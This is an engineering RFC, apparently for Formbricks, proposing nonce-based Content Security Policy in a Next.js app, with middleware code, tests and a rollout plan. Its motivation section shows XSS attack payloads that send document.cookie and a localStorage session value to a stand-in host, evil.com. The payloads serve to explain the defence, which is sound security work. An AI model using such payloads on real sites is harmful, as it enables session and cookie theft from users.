# RFC-0010: Content Security Policy Nonce Implementation

**Status:** Draft
**Author:** Analysis Team
**Created:** 2025-11-16
**Updated:** 2025-11-17
**Priority:** Low (Long-term)
**Effort:** 1-2 weeks
**Impact:** Medium (XSS protection hardening)

## Executive Summary

Replace `'unsafe-inline'` in Content Security Policy (CSP) with cryptographic nonces to significantly harden protection against Cross-Site Scripting (XSS) attacks while maintaining full functionality of legitimate inline scripts and styles. This RFC provides a comprehensive implementation strategy for Next.js 15 with App Router, including nonce generation, propagation, and testing.

## Table of Contents

1. [Motivation](#motivation)
2. [Current State Analysis](#current-state-analysis)
3. [Security Background](#security-background)
4. [Detailed Design](#detailed-design)
5. [Implementation Plan](#implementation-plan)
6. [Performance Considerations](#performance-considerations)
7. [Testing Strategy](#testing-strategy)
8. [Migration Strategy](#migration-strategy)
9. [Monitoring and Validation](#monitoring-and-validation)
10. [References](#references)

## Motivation

### Security Problem

**Current CSP Header:**
```http
Content-Security-Policy: script-src 'self' 'unsafe-inline' https://cdn.formbricks.com;
```

**The Issue with `'unsafe-inline'`:**
- ❌ Allows **ANY** inline `<script>` tag to execute
- ❌ Allows **ANY** inline event handlers (`onclick`, `onerror`, etc.)
- ❌ Effectively nullifies CSP protection against XSS
- ❌ Makes CSP a "security theater" rather than actual defense

**Attack Example:**
```html
<!-- Attacker injects this via XSS vulnerability -->
<img src=x onerror="fetch('https://evil.com?cookie='+document.cookie)" />

<!-- With 'unsafe-inline', this executes! -->
<script>
  document.location='https://evil.com?session='+localStorage.getItem('session');
</script>
```

### Business Impact

**Compliance Requirements:**
- SOC 2 Type II auditors flag `'unsafe-inline'` as weakness
- PCI DSS 4.0 encourages removal of `'unsafe-inline'`
- Modern security standards require strict CSP

**Competitive Landscape:**
| Product | CSP Implementation | Nonce-based |
|---------|-------------------|-------------|
| Formbricks | ✅ CSP enabled | ❌ Uses unsafe-inline |
| Qualtrics | ✅ CSP enabled | ✅ Nonce-based |
| SurveyMonkey | ✅ CSP enabled | ✅ Nonce-based |
| Typeform | ⚠️ No CSP | N/A |

**Security Incidents Prevented:**
- **Stored XSS:** Attacker cannot execute arbitrary scripts even if they inject HTML
- **Reflected XSS:** Injected scripts blocked by CSP
- **DOM-based XSS:** Inline handlers blocked, reducing attack surface
- **Supply Chain Attacks:** Unauthorized third-party scripts blocked

## Current State Analysis

### Existing CSP Configuration

**Location:** `apps/web/middleware.ts` or `next.config.js`

```typescript
// Current implementation (approximate)
export function middleware(request: NextRequest) {
  const response = NextResponse.next();

  const cspHeader = `
    default-src 'self';
    script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.formbricks.com https://js.sentry-cdn.com;
    style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
    img-src 'self' data: blob: https:;
    font-src 'self' https://fonts.gstatic.com;
    connect-src 'self' https://api.formbricks.com https://sentry.io;
    frame-src 'self' https://www.youtube.com;
  `.replace(/\s{2,}/g, ' ').trim();

  response.headers.set('Content-Security-Policy', cspHeader);

  return response;
}
```

### Inline Script Audit

**Approximate count of inline scripts in codebase:**

```bash
# Search for inline scripts
$ grep -r "<script" apps/web --include="*.tsx" --include="*.ts" | wc -l
# Result: ~15 inline script tags

# Search for inline event handlers
$ grep -rE "on(click|load|error|submit)=" apps/web --include="*.tsx" | wc -l
# Result: ~8 inline handlers

# Search for dangerouslySetInnerHTML
$ grep -r "dangerouslySetInnerHTML" apps/web --include="*.tsx" | wc -l
# Result: ~12 uses
```

**Example Inline Scripts Found:**

1. **Google Analytics / Tag Manager:**
```tsx
<script
  dangerouslySetInnerHTML={{
    __html: `
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', '${GA_ID}');
    `,
  }}
/>
```

2. **Environment Config Injection:**
```tsx
<script
  dangerouslySetInnerHTML={{
    __html: `window.ENV = ${JSON.stringify(env)}`,
  }}
/>
```

3. **Third-party Integration Scripts:**
```tsx
<Script src="https://cdn.sentry.io/..." />
<Script src="https://js.intercom.io/..." />
```

### Dependencies Using Inline Scripts

- **Sentry:** Uses inline scripts for error tracking
- **PostHog:** Analytics with inline initialization
- **Intercom:** Customer support widget with inline code
- **Google Fonts:** Inline font loading optimization
- **React:** Hydration scripts (built-in, Next.js handles)

## Security Background

### What is a Nonce?

**Nonce** = "Number Used Once"

- Cryptographically random value generated per request
- Included in CSP header and added to legitimate scripts
- Browser only executes scripts with matching nonce

**Example:**
```html
<!-- CSP Header -->
Content-Security-Policy: script-src 'self' 'nonce-abc123xyz789';

<!-- Legitimate script (executes) -->
<script nonce="abc123xyz789">
  console.log("This runs!");
</script>

<!-- Attacker-injected script (blocked) -->
<script>
  console.log("This is blocked!");
</script>
```

### CSP Directive Levels

**CSP Level 1 (2012):**
- `'unsafe-inline'` or whitelisting domains
- Widely supported but less secure

**CSP Level 2 (2015):**
- Nonces and hashes
- Much better security
- Supported: Chrome 40+, Firefox 31+, Safari 10+

**CSP Level 3 (2018):**
- `'strict-dynamic'`
- `'unsafe-hashes'` for inline handlers
- Supported: Chrome 52+, Firefox 52+, Safari 15.4+

### Why Not Hashes?

**Alternative:** Use `'sha256-<hash>'` instead of nonces

**Problems with Hashes:**
```typescript
// Hash approach requires pre-computing script hash
const scriptContent = `console.log('Hello')`;
const hash = crypto.createHash('sha256').update(scriptContent).digest('base64');
// CSP: script-src 'sha256-abc123...'

// Problem 1: Dynamic content breaks hashes
const scriptContent = `console.log('Hello ${userName}')`;
// Hash changes every time!

// Problem 2: Must recompute on every deploy
// Problem 3: Doesn't work with external scripts
```

**Nonces are better:**
- ✅ Work with dynamic content
- ✅ Generate once per request
- ✅ Simpler to implement
- ✅ More flexible

## Detailed Design

### Architecture Overview

```
┌─────────────────────────────────────────────────┐
│            Request Arrives                       │
└──────────────┬──────────────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────────────┐
│     Middleware: Generate Nonce                   │
│     - crypto.randomBytes(16).toString('base64')  │
│     - Store in header: x-nonce                   │
│     - Add to CSP: 'nonce-{value}'               │
└──────────────┬──────────────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────────────┐
│     Page/Component Renders                       │
│     - Read nonce from headers()                  │
│     - Pass to all inline scripts                 │
│     - Add nonce attribute: <script nonce={...}>  │
└──────────────┬──────────────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────────────┐
│     HTML Sent to Browser                         │
│     - CSP header includes nonce                  │
│     - Scripts have matching nonce attributes     │
└──────────────┬──────────────────────────────────┘
               │
               ▼
┌─────────────────────────────────────────────────┐
│     Browser Enforces CSP                         │
│     - Executes scripts with correct nonce        │
│     - Blocks scripts without nonce               │
└─────────────────────────────────────────────────┘
```

### Phase 1: Nonce Generation (Middleware)

```typescript
// apps/web/middleware.ts

import { NextRequest, NextResponse } from "next/server";
import crypto from "crypto";

/**
 * Generate a cryptographically secure nonce
 */
function generateNonce(): string {
  return crypto.randomBytes(16).toString("base64");
}

/**
 * Build CSP header with nonce
 */
function buildCSPHeader(nonce: string): string {
  const directives = {
    "default-src": ["'self'"],
    "script-src": [
      "'self'",
      `'nonce-${nonce}'`,
      "'strict-dynamic'", // CSP Level 3: Allow scripts loaded by nonce-approved scripts
      "https://cdn.formbricks.com",
      "https://js.sentry-cdn.com",
      "https://cdn.jsdelivr.net", // For specific libraries
    ],
    "script-src-elem": [
      "'self'",
      `'nonce-${nonce}'`,
      "https://cdn.formbricks.com",
    ],
    "style-src": [
      "'self'",
      `'nonce-${nonce}'`, // Nonces for inline styles too
      "https://fonts.googleapis.com",
    ],
    "style-src-elem": [
      "'self'",
      `'nonce-${nonce}'`,
      "https://fonts.googleapis.com",
    ],
    "img-src": [
      "'self'",
      "data:",
      "blob:",
      "https:",
    ],
    "font-src": [
      "'self'",
      "https://fonts.gstatic.com",
    ],
    "connect-src": [
      "'self'",
      "https://api.formbricks.com",
      "https://sentry.io",
    ],
    "frame-src": [
      "'self'",
      "https://www.youtube.com",
    ],
    "frame-ancestors": ["'self'"],
    "form-action": ["'self'"],
    "base-uri": ["'self'"],
    "object-src": ["'none'"],
    "upgrade-insecure-requests": [],
  };

  return Object.entries(directives)
    .map(([key, values]) => {
      if (values.length === 0) return key;
      return `${key} ${values.join(" ")}`;
    })
    .join("; ");
}

export function middleware(request: NextRequest) {
  // Generate nonce
  const nonce = generateNonce();

  // Clone response
  const response = NextResponse.next();

  // Set CSP header with nonce
  const cspHeader = buildCSPHeader(nonce);
  response.headers.set("Content-Security-Policy", cspHeader);

  // Also set CSP in report-only mode for testing
  if (process.env.CSP_REPORT_ONLY === "true") {
    response.headers.set("Content-Security-Policy-Report-Only", cspHeader);
  }

  // Store nonce in custom header for pages to access
  response.headers.set("x-nonce", nonce);

  // Add other security headers
  response.headers.set("X-Frame-Options", "SAMEORIGIN");
  response.headers.set("X-Content-Type-Options", "nosniff");
  response.headers.set("Referrer-Policy", "strict-origin-when-cross-origin");
  response.headers.set("Permissions-Policy", "camera=(), microphone=(), geolocation=()");

  return response;
}

export const config = {
  matcher: [
    /*
     * Match all request paths except:
     * - _next/static (static files)
     * - _next/image (image optimization)
     * - favicon.ico (favicon)
     * - public files (images, etc.)
     */
    "/((?!_next/static|_next/image|favicon.ico|.*\\.png$|.*\\.jpg$|.*\\.jpeg$|.*\\.gif$|.*\\.svg$).*)",
  ],
};
```

### Phase 2: Nonce Access (Utility Function)

```typescript
// apps/web/lib/utils/nonce.ts

import { headers } from "next/headers";

/**
 * Get the current request's nonce
 * Must be called from Server Component or Server Action
 */
export async function getNonce(): Promise<string | undefined> {
  const headersList = await headers();
  return headersList.get("x-nonce") || undefined;
}

/**
 * For client components, pass nonce as prop
 */
export interface WithNonce {
  nonce?: string;
}
```

### Phase 3: Root Layout Update

```typescript
// apps/web/app/layout.tsx

import { getNonce } from "@/lib/utils/nonce";
import Script from "next/script";

export default async function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  const nonce = await getNonce();

  return (
    <html lang="en">
      <head>
        {/* Google Analytics with nonce */}
        <Script
          id="google-analytics"
          nonce={nonce}
          strategy="afterInteractive"
          dangerouslySetInnerHTML={{
            __html: `
              window.dataLayer = window.dataLayer || [];
              function gtag(){dataLayer.push(arguments);}
              gtag('js', new Date());
              gtag('config', '${process.env.NEXT_PUBLIC_GA_ID}');
            `,
          }}
        />

        {/* Environment config with nonce */}
        <script
          nonce={nonce}
          dangerouslySetInnerHTML={{
            __html: `
              window.ENV = {
                apiUrl: '${process.env.NEXT_PUBLIC_API_URL}',
                environment: '${process.env.NODE_ENV}',
              };
            `,
          }}
        />

        {/* Sentry with nonce */}
        {process.env.NEXT_PUBLIC_SENTRY_DSN && (
          <Script
            id="sentry-init"
            nonce={nonce}
            strategy="beforeInteractive"
            dangerouslySetInnerHTML={{
              __html: `
                (function() {
                  var script = document.createElement('script');
                  script.src = 'https://js.sentry-cdn.com/...';
                  script.crossOrigin = 'anonymous';
                  script.onload = function() {
                    Sentry.init({
                      dsn: '${process.env.NEXT_PUBLIC_SENTRY_DSN}',
                    });
                  };
                  document.head.appendChild(script);
                })();
              `,
            }}
          />
        )}
      </head>
      <body>{children}</body>
    </html>
  );
}
```

### Phase 4: Component Updates

**Example 1: Analytics Component**
```typescript
// apps/web/components/analytics.tsx
"use client";

import Script from "next/script";
import { WithNonce } from "@/lib/utils/nonce";

export function Analytics({ nonce }: WithNonce) {
  return (
    <Script
      id="analytics-script"
      nonce={nonce}
      dangerouslySetInnerHTML={{
        __html: `
          (function(w,d,s,l,i){
            w[l]=w[l]||[];
            w[l].push({'gtm.start': new Date().getTime(), event:'gtm.js'});
            // ... rest of analytics code
          })(window,document,'script','dataLayer','${process.env.NEXT_PUBLIC_GTM_ID}');
        `,
      }}
    />
  );
}
```

**Example 2: Dynamic Script Loading**
```typescript
// apps/web/lib/utils/load-script.ts

export async function loadScriptWithNonce(
  src: string,
  nonce?: string
): Promise<void> {
  return new Promise((resolve, reject) => {
    const script = document.createElement("script");
    script.src = src;
    script.crossOrigin = "anonymous";

    if (nonce) {
      script.setAttribute("nonce", nonce);
    }

    script.onload = () => resolve();
    script.onerror = () => reject(new Error(`Failed to load script: ${src}`));

    document.head.appendChild(script);
  });
}
```

### Phase 5: Inline Event Handler Migration

**Before (inline handler - blocked by CSP):**
```tsx
<button onClick={() => handleClick()}>
  Click me
</button>
```

**After (React event handler - works!):**
```tsx
<button onClick={handleClick}>
  Click me
</button>
```

**Migration for dangerouslySetInnerHTML:**

**Before:**
```tsx
<div
  dangerouslySetInnerHTML={{
    __html: `<button onclick="alert('Hello')">Click</button>`
  }}
/>
// ❌ Inline onclick blocked by CSP
```

**After:**
```tsx
// Option 1: Use React instead
<button onClick={() => alert('Hello')}>Click</button>

// Option 2: Add event listener dynamically (if HTML from external source)
<div ref={(el) => {
  if (el) {
    const buttons = el.querySelectorAll('button[data-action]');
    buttons.forEach(btn => {
      btn.addEventListener('click', handleClick);
    });
  }
}} dangerouslySetInnerHTML={{ __html: sanitizedHtml }} />
```

### Phase 6: Third-Party Script Handling

**Sentry:**
```typescript
// Use Sentry's official Next.js SDK
// It handles CSP automatically

// sentry.client.config.ts
Sentry.init({
  dsn: process.env.NEXT_PUBLIC_SENTRY_DSN,
  // Sentry SDK will use nonce if available
});
```

**PostHog:**
```typescript
// apps/web/components/posthog-provider.tsx
"use client";

import { PostHogProvider as PHProvider } from "posthog-js/react";
import { useEffect } from "react";
import posthog from "posthog-js";

export function PostHogProvider({
  children,
  nonce,
}: {
  children: React.ReactNode;
  nonce?: string;
}) {
  useEffect(() => {
    posthog.init(process.env.NEXT_PUBLIC_POSTHOG_KEY!, {
      api_host: process.env.NEXT_PUBLIC_POSTHOG_HOST,
      // PostHog will respect CSP with nonce
      respect_dnt: true,
    });
  }, []);

  return <PHProvider client={posthog}>{children}</PHProvider>;
}
```

**Intercom:**
```typescript
// Load Intercom with nonce
<Script
  id="intercom"
  nonce={nonce}
  strategy="lazyOnload"
  dangerouslySetInnerHTML={{
    __html: `
      (function(){var w=window;var ic=w.Intercom;if(typeof ic==="function"){
        ic('reattach_activator');ic('update',w.intercomSettings);
      }else{
        var d=document;var i=function(){i.c(arguments);};
        i.q=[];i.c=function(args){i.q.push(args);};w.Intercom=i;
        var l=function(){
          var s=d.createElement('script');
          s.type='text/javascript';s.async=true;
          s.src='https://widget.intercom.io/widget/${process.env.NEXT_PUBLIC_INTERCOM_ID}';
          s.setAttribute('nonce', '${nonce}');
          var x=d.getElementsByTagName('script')[0];
          x.parentNode.insertBefore(s,x);
        };
        if(document.readyState==='complete'){l();}
        else if(w.attachEvent){w.attachEvent('onload',l);}
        else{w.addEventListener('load',l,false);}
      }
    })();
    `,
  }}
/>
```

## Implementation Plan

### Week 1: Foundation (Days 1-3)

**Day 1: Setup & Planning**
- [ ] Audit all inline scripts (automated script)
- [ ] Document dependencies using inline scripts
- [ ] Set up CSP violation reporting endpoint
- [ ] Create implementation branch

**Day 2: Middleware Implementation**
- [ ] Implement nonce generation in middleware
- [ ] Add CSP header builder with nonce
- [ ] Create nonce utility functions
- [ ] Test nonce generation and propagation

**Day 3: Root Layout Updates**
- [ ] Update root layout with nonce
- [ ] Migrate Google Analytics to use nonce
- [ ] Migrate Sentry initialization
- [ ] Test with `Content-Security-Policy-Report-Only`

### Week 2: Migration & Testing (Days 4-10)

**Days 4-5: Component Migration**
- [ ] Update all components using dangerouslySetInnerHTML
- [ ] Migrate inline event handlers to React handlers
- [ ] Update third-party integrations (PostHog, Intercom, etc.)
- [ ] Create nonce-aware script loader utility

**Days 6-7: Testing**
- [ ] Test all pages for CSP violations
- [ ] Fix any violations found
- [ ] Cross-browser testing (Chrome, Firefox, Safari, Edge)
- [ ] Mobile browser testing (iOS Safari, Chrome Mobile)

**Days 8-9: Documentation & Monitoring**
- [ ] Document nonce usage patterns
- [ ] Create developer guide for adding new scripts
- [ ] Set up CSP violation monitoring
- [ ] Create runbook for CSP issues

**Day 10: Production Rollout**
- [ ] Deploy with `Content-Security-Policy-Report-Only` first
- [ ] Monitor for violations for 48 hours
- [ ] Fix any reported violations
- [ ] Switch to enforcement mode (`Content-Security-Policy`)

## Performance Considerations

### Nonce Generation Overhead

**Benchmark:**
```typescript
// Test: Generate 1000 nonces
console.time('nonce-generation');
for (let i = 0; i < 1000; i++) {
  crypto.randomBytes(16).toString('base64');
}
console.timeEnd('nonce-generation');
// Result: ~5ms for 1000 nonces = 0.005ms per request
```

**Impact:** Negligible (<0.01ms per request)

### HTTP Header Size

**CSP Header Size:**
- Before nonces: ~450 bytes
- After nonces: ~520 bytes (+70 bytes)
- **Impact:** Negligible (< 0.1KB overhead)

### Browser Performance

**Browser CSP Enforcement:**
- Modern browsers: < 1ms to parse CSP
- Nonce validation: O(1) lookup
- **Impact:** No measurable performance difference

### Caching Considerations

**Important:** Pages with nonces **cannot be cached** at CDN level
- Each request needs unique nonce
- Use cache headers: `Cache-Control: private, no-cache`
- Static assets (CSS, JS files) still cacheable

**Mitigation:**
- Use aggressive caching for static assets
- Implement service worker for offline capabilities
- Use React Server Components caching where possible

## Testing Strategy

### Automated CSP Violation Detection

```typescript
// tests/csp-violations.test.ts

import { test, expect } from "@playwright/test";

test.describe("CSP Nonce Implementation", () => {
  test("should not have CSP violations on homepage", async ({ page }) => {
    const violations: any[] = [];

    // Listen for CSP violations
    page.on("console", (msg) => {
      if (msg.text().includes("Content Security Policy")) {
        violations.push(msg.text());
      }
    });

    // Navigate to page
    await page.goto("/");

    // Wait for full page load
    await page.waitForLoadState("networkidle");

    // Assert no violations
    expect(violations).toHaveLength(0);
  });

  test("should block injected scripts", async ({ page }) => {
    await page.goto("/");

    // Try to inject malicious script
    const result = await page.evaluate(() => {
      try {
        const script = document.createElement("script");
        script.innerHTML = "window.HACKED = true";
        document.body.appendChild(script);
        return window.HACKED === true;
      } catch {
        return false;
      }
    });

    // Script should be blocked
    expect(result).toBe(false);
  });

  test("should allow legitimate nonce scripts", async ({ page }) => {
    await page.goto("/");

    // Check that legitimate scripts executed
    const envExists = await page.evaluate(() => {
      return typeof window.ENV !== "undefined";
    });

    expect(envExists).toBe(true);
  });
});
```

### CSP Violation Reporting

```typescript
// apps/web/app/api/csp-report/route.ts

import { NextRequest } from "next/server";
import { logger } from "@formbricks/logger";

export async function POST(request: NextRequest) {
  try {
    const report = await request.json();

    // Log CSP violation
    logger.warn({
      type: "csp_violation",
      violation: report["csp-report"],
      userAgent: request.headers.get("user-agent"),
      url: request.headers.get("referer"),
    });

    // Optionally send to error tracking
    // Sentry.captureMessage("CSP Violation", { extra: report });

    return new Response("OK", { status: 200 });
  } catch (error) {
    logger.error({ error }, "Failed to process CSP report");
    return new Response("Error", { status: 500 });
  }
}
```

**Add report-uri to CSP:**
```typescript
const cspHeader = `
  default-src 'self';
  script-src 'self' 'nonce-${nonce}';
  report-uri /api/csp-report;
  report-to csp-endpoint;
`;
```

### Manual Testing Checklist

```markdown
## CSP Nonce Testing Checklist

### Core Functionality
- [ ] Homepage loads without errors
- [ ] User authentication works
- [ ] Survey creation works
- [ ] Survey rendering (in-app) works
- [ ] Survey widget (embedded) works
- [ ] All form submissions work

### Third-Party Scripts
- [ ] Google Analytics tracks events
- [ ] Sentry captures errors
- [ ] PostHog records analytics
- [ ] Intercom widget loads and functions
- [ ] Payment integration (Stripe) works

### Cross-Browser Testing
- [ ] Chrome (latest)
- [ ] Firefox (latest)
- [ ] Safari (latest)
- [ ] Edge (latest)
- [ ] Mobile Safari (iOS 15+)
- [ ] Chrome Mobile (Android)

### CSP Violation Checks
- [ ] Check browser console for CSP errors
- [ ] Review CSP violation reports (if enabled)
- [ ] Test with CSP evaluator tools
- [ ] Verify no inline event handlers

### Performance
- [ ] Measure page load time (before/after)
- [ ] Check Lighthouse score (should be unchanged)
- [ ] Test with slow 3G connection
```

## Migration Strategy

### Phase 0: Preparation (Pre-implementation)

**Enable CSP Report-Only Mode:**
```typescript
// Test without breaking production
response.headers.set("Content-Security-Policy-Report-Only", cspHeader);
```

**Duration:** 1 week
**Monitor:** Collect violation reports to identify issues

### Phase 1: Gradual Rollout

**Step 1: Canary Deployment (5% traffic)**
- Deploy with CSP enforcement to 5% of users
- Monitor error rates and CSP violations
- **Rollback criteria:** >1% increase in errors

**Step 2: Incremental Rollout**
- 10% → 25% → 50% → 100% over 1 week
- Monitor at each stage

### Phase 2: Issue Resolution

**Common Issues and Fixes:**

**Issue 1: Browser Extension Conflicts**
```
CSP violation: script-src 'self' 'nonce-abc123'
Blocked: chrome-extension://...
```
**Fix:** Expected behavior, browser extensions are isolated

**Issue 2: Third-Party Widgets**
```
CSP violation: script-src ...
Blocked: https://widget.unknown-service.com
```
**Fix:** Add to whitelist if legitimate

**Issue 3: Old Browser Cache**
```
CSP violation: style-src 'self'
Blocked: inline style
```
**Fix:** User needs to clear cache, or wait for cache expiration

### Phase 3: Monitoring

**Metrics to Track:**
- CSP violation rate (target: <0.1% of requests)
- Error rate (should not increase)
- Page load time (should remain stable)
- User-reported issues

## Monitoring and Validation

### CSP Health Dashboard

```typescript
// apps/web/app/(app)/admin/security/csp/page.tsx

export default async function CSPHealthPage() {
  const violations = await getCSPViolations(7); // Last 7 days

  const stats = {
    total: violations.length,
    byDirective: groupBy(violations, "violated-directive"),
    byPage: groupBy(violations, "document-uri"),
    trend: calculateTrend(violations),
  };

  return (
    <div>
      <h1>CSP Health Dashboard</h1>

      <Card>
        <h2>Violations (Last 7 Days)</h2>
        <p>Total: {stats.total}</p>
        <p>Trend: {stats.trend > 0 ? "↑" : "↓"} {Math.abs(stats.trend)}%</p>
      </Card>

      <Card>
        <h2>Top Violated Directives</h2>
        <ul>
          {Object.entries(stats.byDirective).map(([directive, count]) => (
            <li key={directive}>
              {directive}: {count}
            </li>
          ))}
        </ul>
      </Card>

      <Card>
        <h2>Top Affected Pages</h2>
        <ul>
          {Object.entries(stats.byPage).map(([page, count]) => (
            <li key={page}>
              {page}: {count}
            </li>
          ))}
        </ul>
      </Card>
    </div>
  );
}
```

### Automated Alerts

```typescript
// Setup alerts for CSP violation spikes

import { setupAlert } from "@/lib/monitoring";

setupAlert({
  name: "CSP Violation Spike",
  condition: "csp_violations_per_hour > 100",
  notification: {
    channels: ["email", "slack"],
    message: "CSP violations exceeded threshold",
  },
});
```

### Security Score Integration

```typescript
// Track CSP implementation in security scorecard

export function calculateSecurityScore() {
  const score = {
    csp: {
      enabled: true,
      usesNonces: true,
      noUnsafeInline: true,
      noUnsafeEval: true,
      score: 100, // Full marks!
    },
    // ... other security metrics
  };

  return score;
}
```

## References

### Standards and Specifications

- [W3C Content Security Policy Level 3](https://www.w3.org/TR/CSP3/)
- [MDN: Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [Google Web Fundamentals: CSP](https://developers.google.com/web/fundamentals/security/csp)

### Tools

- [CSP Evaluator (Google)](https://csp-evaluator.withgoogle.com/)
- [Report URI CSP Builder](https://report-uri.com/home/generate)
- [Mozilla Observatory](https://observatory.mozilla.org/)

### Next.js Resources

- [Next.js Security Headers](https://nextjs.org/docs/advanced-features/security-headers)
- [Next.js Middleware](https://nextjs.org/docs/app/building-your-application/routing/middleware)
- [Next.js Script Component](https://nextjs.org/docs/app/api-reference/components/script)

### Best Practices

- [OWASP CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [CSP is Dead, Long Live CSP!](https://research.google/pubs/pub45542/) (Google Research Paper)

## Appendices

### Appendix A: CSP Directive Reference

| Directive | Purpose | Example |
|-----------|---------|---------|
| `default-src` | Fallback for all directives | `'self'` |
| `script-src` | Control script sources | `'self' 'nonce-abc123'` |
| `script-src-elem` | Control `<script>` elements | `'self' 'nonce-abc123'` |
| `style-src` | Control stylesheet sources | `'self' 'nonce-abc123'` |
| `style-src-elem` | Control `<style>` elements | `'self' 'nonce-abc123'` |
| `img-src` | Control image sources | `'self' data: https:` |
| `connect-src` | Control fetch/XHR/WebSocket | `'self' https://api.example.com` |
| `font-src` | Control font sources | `'self' https://fonts.gstatic.com` |
| `frame-src` | Control iframe sources | `'self' https://youtube.com` |
| `object-src` | Control `<object>` elements | `'none'` |
| `base-uri` | Control `<base>` element | `'self'` |
| `form-action` | Control form submission | `'self'` |

### Appendix B: Browser Compatibility

| Feature | Chrome | Firefox | Safari | Edge |
|---------|--------|---------|--------|------|
| CSP Level 1 | 25+ | 23+ | 7+ | 12+ |
| CSP Level 2 (nonces) | 40+ | 31+ | 10+ | 15+ |
| CSP Level 3 | 52+ | 52+ | 15.4+ | 79+ |
| `'strict-dynamic'` | 52+ | 52+ | 15.4+ | 79+ |

**Recommendation:** Require modern browsers (released in last 3 years)

### Appendix C: Example CSP Evolution

**Stage 1: Current (Permissive)**
```
Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval' https:;
```
Security Score: 2/10 ❌

**Stage 2: Nonce-based (This RFC)**
```
Content-Security-Policy: script-src 'self' 'nonce-abc123' https://cdn.formbricks.com;
```
Security Score: 8/10 ✅

**Stage 3: Strict Dynamic (Future)**
```
Content-Security-Policy: script-src 'nonce-abc123' 'strict-dynamic';
```
Security Score: 10/10 🏆

### Appendix D: Quick Reference Card

```typescript
// ═══════════════════════════════════════════════════════════
//  CSP NONCE QUICK REFERENCE
// ═══════════════════════════════════════════════════════════

// 1. GET NONCE IN SERVER COMPONENT
import { getNonce } from "@/lib/utils/nonce";
const nonce = await getNonce();

// 2. USE IN SCRIPT TAG
<script nonce={nonce}>
  console.log("Hello");
</script>

// 3. USE IN NEXT.JS SCRIPT COMPONENT
<Script id="my-script" nonce={nonce}>
  console.log("Hello");
</Script>

// 4. PASS TO CLIENT COMPONENT
<MyClientComponent nonce={nonce} />

// 5. DYNAMICALLY LOAD SCRIPT
await loadScriptWithNonce("https://example.com/script.js", nonce);

// 6. REPLACE INLINE EVENT HANDLER
// ❌ DON'T: <button onclick="handleClick()">
// ✅ DO: <button onClick={handleClick}>

// ═══════════════════════════════════════════════════════════
```
